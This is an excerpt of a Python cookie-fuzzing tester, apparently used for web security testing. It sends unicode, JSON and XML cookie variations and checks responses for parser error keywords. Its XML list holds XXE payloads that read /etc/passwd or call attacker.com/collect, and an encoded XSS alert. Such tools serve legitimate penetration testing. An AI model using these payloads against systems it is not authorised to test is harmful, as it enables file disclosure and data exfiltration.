...
class CustomCookieTester:
    ...
    def test_unicode_manipulation(self):
        ...
        unicode_variations = [
            ...
            {'name': self.cookie_name, 'value': 'unicode_value_\u00e9\u00e8\u00e0'},  # Latin accents
            ...
            {'name': self.cookie_name, 'value': 'RTL_\u061c\u0628\u0644\u062f'},  # Right-to-left text
    ...
    def test_json_in_cookies(self):
        ...
        for variation in json_variations:
            ...
            if response:
                ...
                response_text = response.text.lower()
                error_indicators = [
                    "json", "syntax", "parse", "error", "exception",
                    "unexpected", "token", "position", "invalid"
                ]
                
                errors_found = [indicator for indicator in error_indicators 
                               if indicator in response_text[:1000]]
    ...
    def test_xml_entities_in_cookies(self):
        ...
        xml_variations = [
            {'name': self.cookie_name, 'value': 'normal_value'},
            {'name': self.cookie_name, 'value': '<!DOCTYPE test [<!ENTITY xxe "test">]><x>&xxe;</x>'},
            {'name': self.cookie_name, 'value': '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>'},
            {'name': self.cookie_name, 'value': '<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/collect">]><x>&xxe;</x>'},
            ...
            {'name': self.cookie_name, 'value': 'value&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;'},
        ]
        ...
        for variation in xml_variations:
            ...
            if response:
                ...
                response_text = response.text.lower()
                error_indicators = [
                    "xml", "entity", "dtd", "parser", "syntax", "malformed",
    ...
    def run_all_tests(self):
        ...
        # Save results
        output_file = os.path.join(self.output_dir, f'custom_tests_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
...
def main():
    ...
    try:
        ...
        for test_name, test_results in results['tests'].items():
            ...
            injection_count = sum(1 for r in test_results['results'] if r.get('header_injection_succeeded') 
                                 or r.get('cookie_injection_succeeded'))
